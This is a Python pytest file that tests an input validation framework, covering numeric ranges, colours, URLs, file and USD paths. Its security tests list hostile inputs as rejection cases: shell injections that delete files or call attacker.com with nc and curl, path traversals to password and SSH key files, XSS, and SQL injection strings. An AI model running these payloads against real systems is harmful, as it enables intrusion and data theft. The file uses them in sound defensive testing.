"""
Tests for centralized input validation framework.

Tests all validation methods to ensure they properly reject malicious
input and accept valid data.
"""

import pytest
import json
from pathlib import Path

from agentworld_core.validation import (
    InputValidator,
    ValidationError,
    create_gstreamer_validator,
    create_web_validator,
    create_asset_validator
)


class TestInputValidator:
    """Test suite for centralized input validation."""

    def setup_method(self):
        """Set up test environment."""
        self.validator = InputValidator()

    def test_validate_string_basic(self):
        """Test basic string validation."""
        # Valid strings
        assert self.validator.validate_string('test_field', 'hello') == 'hello'
        assert self.validator.validate_string('test_field', 'test123') == 'test123'

        # Invalid types (note: numeric types are auto-converted to strings)
        result = self.validator.validate_string('test_field', 123)
        assert result == '123'

        # Empty strings
        with pytest.raises(ValidationError, match="cannot be empty"):
            self.validator.validate_string('test_field', '')

        # Allow empty
        assert self.validator.validate_string('test_field', '', allow_empty=True) == ''

    def test_validate_string_length(self):
        """Test string length validation."""
        # Too short
        with pytest.raises(ValidationError, match="must be at least 5 characters"):
            self.validator.validate_string('test_field', 'hi', min_length=5)

        # Too long
        with pytest.raises(ValidationError, match="must be at most 3 characters"):
            self.validator.validate_string('test_field', 'hello', max_length=3)

        # Valid length
        result = self.validator.validate_string('test_field', 'hello', min_length=3, max_length=10)
        assert result == 'hello'

    def test_validate_string_patterns(self):
        """Test string pattern validation."""
        # Alphanumeric
        assert self.validator.validate_string('test_field', 'abc123', pattern='alphanumeric') == 'abc123'
        with pytest.raises(ValidationError, match="does not match required pattern"):
            self.validator.validate_string('test_field', 'abc-123', pattern='alphanumeric')

        # UUID
        valid_uuid = 'f47ac10b-58cc-4372-a567-0e02b2c3d479'
        assert self.validator.validate_string('test_field', valid_uuid, pattern='uuid') == valid_uuid
        with pytest.raises(ValidationError):
            self.validator.validate_string('test_field', 'invalid-uuid', pattern='uuid')

        # Hex color
        assert self.validator.validate_string('test_field', '#FF0000', pattern='hex_color') == '#FF0000'
        with pytest.raises(ValidationError):
            self.validator.validate_string('test_field', 'FF0000', pattern='hex_color')

    def test_validate_string_dangerous_chars(self):
        """Test dangerous character detection."""
        # Shell injection
        dangerous_shell = ['echo hello; rm -rf /', 'cmd && cat /etc/passwd', 'test | nc attacker.com']
        for dangerous in dangerous_shell:
            with pytest.raises(ValidationError, match="dangerous character"):
                self.validator.validate_string('test_field', dangerous, dangerous_chars='shell')

        # Path traversal
        dangerous_paths = ['../../../etc/passwd', '~/.ssh/id_rsa', 'file;rm -rf /']
        for dangerous in dangerous_paths:
            with pytest.raises(ValidationError, match="dangerous character"):
                self.validator.validate_string('test_field', dangerous, dangerous_chars='path')

    def test_validate_numeric_basic(self):
        """Test basic numeric validation."""
        # Valid numbers
        assert self.validator.validate_numeric('test_field', 42) == 42
        assert self.validator.validate_numeric('test_field', '42') == 42.0
        assert self.validator.validate_numeric('test_field', 3.14) == 3.14
        assert self.validator.validate_numeric('test_field', '3.14') == 3.14

        # Integer only
        assert self.validator.validate_numeric('test_field', 42, integer_only=True) == 42
        assert self.validator.validate_numeric('test_field', '42', integer_only=True) == 42
        with pytest.raises(ValidationError, match="must be a valid integer"):
            self.validator.validate_numeric('test_field', '3.14', integer_only=True)

        # Invalid types
        with pytest.raises(ValidationError, match="must be a valid"):
            self.validator.validate_numeric('test_field', 'abc')

    def test_validate_numeric_range(self):
        """Test numeric range validation."""
        # Valid range
        assert self.validator.validate_numeric('test_field', 50, min_val=1, max_val=100) == 50

        # Too small
        with pytest.raises(ValidationError, match="must be at least 10"):
            self.validator.validate_numeric('test_field', 5, min_val=10)

        # Too large
        with pytest.raises(ValidationError, match="must be at most 100"):
            self.validator.validate_numeric('test_field', 150, max_val=100)

    def test_validate_dimension(self):
        """Test dimension validation."""
        assert self.validator.validate_dimension('width', 1920) == 1920
        assert self.validator.validate_dimension('height', '1080') == 1080

        # Out of range
        with pytest.raises(ValidationError, match="width must be at least 1"):
            self.validator.validate_dimension('width', 0)

        with pytest.raises(ValidationError, match="height must be at most 7680"):
            self.validator.validate_dimension('height', 10000)

    def test_validate_fps(self):
        """Test FPS validation."""
        assert self.validator.validate_fps('fps', 24) == 24
        assert self.validator.validate_fps('fps', '60') == 60

        with pytest.raises(ValidationError, match="fps must be at least 1"):
            self.validator.validate_fps('fps', 0)

        with pytest.raises(ValidationError, match="fps must be at most 120"):
            self.validator.validate_fps('fps', 200)

    def test_validate_bitrate(self):
        """Test bitrate validation."""
        assert self.validator.validate_bitrate('bitrate', 2000) == 2000
        assert self.validator.validate_bitrate('bitrate', '5000') == 5000

        with pytest.raises(ValidationError, match="bitrate must be at least 100"):
            self.validator.validate_bitrate('bitrate', 50)

        with pytest.raises(ValidationError, match="bitrate must be at most 100000"):
            self.validator.validate_bitrate('bitrate', 200000)

    def test_validate_boolean(self):
        """Test boolean validation."""
        # Boolean values
        assert self.validator.validate_boolean('test_field', True) is True
        assert self.validator.validate_boolean('test_field', False) is False

        # String values
        true_strings = ['true', 'True', 'TRUE', '1', 'yes', 'Yes', 'on', 'ON']
        for val in true_strings:
            assert self.validator.validate_boolean('test_field', val) is True

        false_strings = ['false', 'False', 'FALSE', '0', 'no', 'No', 'off', 'OFF']
        for val in false_strings:
            assert self.validator.validate_boolean('test_field', val) is False

        # Numeric values
        assert self.validator.validate_boolean('test_field', 1) is True
        assert self.validator.validate_boolean('test_field', 0) is False

        # Invalid values
        with pytest.raises(ValidationError, match="must be a boolean value"):
            self.validator.validate_boolean('test_field', 'maybe')

    def test_validate_url(self):
        """Test URL validation."""
        # Valid URLs
        valid_urls = [
            'http://example.com',
            'https://example.com/path',
            'srt://127.0.0.1:9999',
            'rtmp://localhost:1935/live/stream'
        ]

        for url in valid_urls:
            result = self.validator.validate_url('test_url', url, allowed_schemes=['http', 'https', 'srt', 'rtmp'])
            assert result == url

        # Invalid schemes
        with pytest.raises(ValidationError, match="scheme must be one of"):
            self.validator.validate_url('test_url', 'ftp://example.com', allowed_schemes=['http', 'https'])

        # Dangerous characters
        with pytest.raises(ValidationError, match="dangerous character"):
            self.validator.validate_url('test_url', 'http://example.com; rm -rf /')

        # Localhost restrictions
        with pytest.raises(ValidationError, match="localhost URLs not allowed"):
            self.validator.validate_url('test_url', 'http://localhost:8080', allow_localhost=False)

    def test_validate_color(self):
        """Test color validation."""
        # Hex colors
        hex_result = self.validator.validate_color('color', '#FF0000')
        assert hex_result == [1.0, 0.0, 0.0]

        hex_result = self.validator.validate_color('color', '#00FF00')
        assert hex_result == [0.0, 1.0, 0.0]

        # RGB lists
        rgb_result = self.validator.validate_color('color', [1.0, 0.5, 0.0])
        assert rgb_result == [1.0, 0.5, 0.0]

        # RGB tuples
        rgb_result = self.validator.validate_color('color', (0.0, 0.0, 1.0))
        assert rgb_result == [0.0, 0.0, 1.0]

        # Invalid hex
        with pytest.raises(ValidationError, match="does not match required pattern"):
            self.validator.validate_color('color', 'FF0000')  # Missing #

        # Invalid RGB
        with pytest.raises(ValidationError, match="must have 3 components"):
            self.validator.validate_color('color', [1.0, 0.5])  # Only 2 components

        with pytest.raises(ValidationError, match="must be at most 1"):
            self.validator.validate_color('color', [2.0, 0.5, 0.0])  # Out of range

    def test_validate_position(self):
        """Test position validation."""
        # 3D position
        pos_3d = self.validator.validate_position('position', [1.0, 2.0, 3.0])
        assert pos_3d == [1.0, 2.0, 3.0]

        # 2D position
        pos_2d = self.validator.validate_position('position', (10.5, 20.5), dimension=2)
        assert pos_2d == [10.5, 20.5]

        # Wrong dimension
        with pytest.raises(ValidationError, match="must have 3 components"):
            self.validator.validate_position('position', [1.0, 2.0])

        # Invalid type
        with pytest.raises(ValidationError, match="must be a list or tuple"):
            self.validator.validate_position('position', '1,2,3')

        # Invalid coordinates
        with pytest.raises(ValidationError, match="must be a valid number"):
            self.validator.validate_position('position', [1.0, 'invalid', 3.0])

    def test_validate_usd_path(self):
        """Test USD path validation."""
        # Valid USD paths
        valid_paths = [
            '/World',
            '/World/MyObject',
            '/World/Group/SubObject',
            '/World/Object_1'
        ]

        for path in valid_paths:
            result = self.validator.validate_usd_path('usd_path', path)
            assert result == path

        # Invalid paths
        with pytest.raises(ValidationError, match="must start with"):
            self.validator.validate_usd_path('usd_path', 'World/Object')

        with pytest.raises(ValidationError, match="dangerous character"):
            self.validator.validate_usd_path('usd_path', '/World/../etc/passwd')

        with pytest.raises(ValidationError, match="dangerous character"):
            self.validator.validate_usd_path('usd_path', '/World/Object; rm -rf /')

    def test_validate_file_path(self):
        """Test file path validation."""
        # Valid file path
        result = self.validator.validate_file_path('file_path', 'assets/model.usd')
        assert result == 'assets/model.usd'

        # Path traversal
        with pytest.raises(ValidationError, match="dangerous character"):
            self.validator.validate_file_path('file_path', '../../../etc/passwd')

        # Extension validation
        result = self.validator.validate_file_path('file_path', 'model.usd', allowed_extensions=['.usd', '.usda'])
        assert result == 'model.usd'

        with pytest.raises(ValidationError, match="must have extension"):
            self.validator.validate_file_path('file_path', 'model.obj', allowed_extensions=['.usd', '.usda'])

    def test_validate_json(self):
        """Test JSON validation."""
        # Valid JSON dict
        test_dict = {'key': 'value', 'number': 42}
        result = self.validator.validate_json('json_field', test_dict)
        assert result == test_dict

        # Valid JSON string
        json_string = '{"key": "value", "number": 42}'
        result = self.validator.validate_json('json_field', json_string)
        assert result == {'key': 'value', 'number': 42}

        # Invalid JSON
        with pytest.raises(ValidationError, match="is not valid JSON"):
            self.validator.validate_json('json_field', '{"invalid": json}')

        # Invalid type
        with pytest.raises(ValidationError, match="must be JSON string or dict"):
            self.validator.validate_json('json_field', 42)

    def test_validate_enum(self):
        """Test enum validation."""
        # Valid enum values
        valid_encoders = ['x264', 'nvenc', 'vaapi']
        result = self.validator.validate_enum('encoder', 'x264', valid_encoders)
        assert result == 'x264'

        # Invalid enum value
        with pytest.raises(ValidationError, match="must be one of"):
            self.validator.validate_enum('encoder', 'invalid', valid_encoders)

    def test_validate_batch(self):
        """Test batch validation."""
        # Valid batch
        validations = [
            ('width', 1920, 'validate_dimension', {}),
            ('height', 1080, 'validate_dimension', {}),
            ('fps', 24, 'validate_fps', {}),
            ('encoder', 'x264', 'validate_enum', {'allowed_values': ['x264', 'nvenc', 'vaapi']})
        ]

        results = self.validator.validate_batch(validations)
        expected = {'width': 1920, 'height': 1080, 'fps': 24, 'encoder': 'x264'}
        assert results == expected

        # Batch with errors
        invalid_validations = [
            ('width', 0, 'validate_dimension', {}),  # Invalid
            ('height', 1080, 'validate_dimension', {}),  # Valid
            ('fps', 200, 'validate_fps', {})  # Invalid
        ]

        with pytest.raises(ValidationError, match="Validation failed"):
            self.validator.validate_batch(invalid_validations)


class TestValidatorFactories:
    """Test validator factory functions."""

    def test_create_gstreamer_validator(self):
        """Test GStreamer validator factory."""
        validator = create_gstreamer_validator()
        assert isinstance(validator, InputValidator)
        assert validator.strict_mode is True

    def test_create_web_validator(self):
        """Test web validator factory."""
        validator = create_web_validator()
        assert isinstance(validator, InputValidator)
        assert validator.strict_mode is True

    def test_create_asset_validator(self):
        """Test asset validator factory."""
        validator = create_asset_validator()
        assert isinstance(validator, InputValidator)
        assert validator.strict_mode is True


class TestSecurityPatterns:
    """Test common security validation patterns."""

    def setup_method(self):
        """Set up test environment."""
        self.validator = InputValidator()

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_injections = [
            'valid; rm -rf /',
            'normal && cat /etc/passwd',
            'input | nc attacker.com 4444',
            'data $(whoami)',
            'text `curl malicious.com`',
            'value & background_task'
        ]

        for injection in command_injections:
            with pytest.raises(ValidationError):
                self.validator.validate_string('test_field', injection, dangerous_chars='shell')

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_traversals = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/var/log/../../etc/shadow',
            'assets/../../../secret.txt',
            '~/../../root/.ssh/id_rsa'
        ]

        for traversal in path_traversals:
            with pytest.raises(ValidationError):
                if '..' in traversal:
                    self.validator.validate_file_path('file_path', traversal)
                else:
                    self.validator.validate_string('test_field', traversal, dangerous_chars='path')

    def test_xss_prevention(self):
        """Test prevention of XSS attacks."""
        xss_payloads = [
            '<script>alert("xss")</script>',
            'javascript:alert("xss")',
            'data:text/html,<script>alert("xss")</script>',
            '<img src=x onerror=alert("xss")>',
            '<body onload=alert("xss")>'
        ]

        for payload in xss_payloads:
            with pytest.raises(ValidationError):
                self.validator.validate_string('test_field', payload, dangerous_chars='xss')

    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks."""
        sql_injections = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'/**/OR/**/1=1--",
            "' UNION SELECT * FROM passwords--",
            "'; EXEC xp_cmdshell('dir'); --"
        ]

        for injection in sql_injections:
            with pytest.raises(ValidationError):
                self.validator.validate_string('test_field', injection, dangerous_chars='sql')


if __name__ == '__main__':
    pytest.main([__file__, '-v'])